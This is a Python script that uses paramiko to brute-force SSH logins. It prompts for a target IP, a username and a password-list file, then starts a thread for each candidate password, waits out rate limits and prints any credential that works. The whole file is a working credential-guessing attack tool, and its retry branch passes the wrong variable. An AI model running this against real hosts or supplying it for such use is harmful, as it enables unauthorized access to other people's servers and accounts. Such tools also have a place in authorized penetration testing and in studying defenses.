import paramiko
import sys
import os.path
import socket
import colorama
from colorama import Fore, Style
import time
import threading
import ipaddress

colorama.init(autoreset=True)
flag = 0
thread_lock = threading.Lock()


def ssh_connect(pswd):
    global flag
    session = paramiko.SSHClient()
    session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        session.connect(host, port=22, username=username, password=pswd)
    except socket.timeout:
        # this is when host is unreachable
        with thread_lock:
            print(f'\n{Fore.RED}[!] Host: {host} is unreachable, timed out.')
            flag = -1
    except paramiko.AuthenticationException:
        # Authentication Failed
        with thread_lock:
            print(f'\n{Fore.RED}[!] Invalid credentials {username}:{pswd}')
            flag = -1
    except paramiko.SSHException:
        with thread_lock:
            print(f'{Fore.BLUE}{Style.DIM}[*] Quota exceeded, retrying with delay....')
            time.sleep(60)  # sleep for a minute and retry again
            return ssh_connect(password)
    else:
        with thread_lock:
            flag = 1
            print(f'\n{Fore.GREEN}{Style.BRIGHT}[+] Match Found:\n\tUsername: {username}\n\tPassword: {pswd}')
    finally:
        session.close()


try:
    try:
        host = input('\n[+] Target IP Address: ')
        ipaddress.ip_address(host)  # return a <class 'ipaddress.IPv4Address'> object
    except ValueError as e:  # A ValueError is raised if address does not represent a valid IPv4 or IPv6 address.
        print(f'\n{Fore.RED}{e}')
        sys.exit()
    username = input('\n[+] Enter username of target host: ')
    pswd_file = input('\n[+] Specify path for passwords file: ')

    if os.path.exists(pswd_file):
        print(f'\n{pswd_file} file is valid!')
        with open(pswd_file, 'r', encoding='utf-8') as file:
            file.seek(0)
            for line in file.readlines():
                if flag == 1:
                    t.join()
                    exit()
                password = line.strip()
                t = threading.Thread(target=ssh_connect, args=(password,))
                t.start()
                time.sleep(0.5)

    else:
        print(f"\n{Fore.RED}[!] File {pswd_file} does not exist :( Please check and try again.\n")
        sys.exit()
except KeyboardInterrupt:
    print(f'\n{Fore.RED}[!!] User Requested an Interrupt [!!]\n')
    sys.exit()
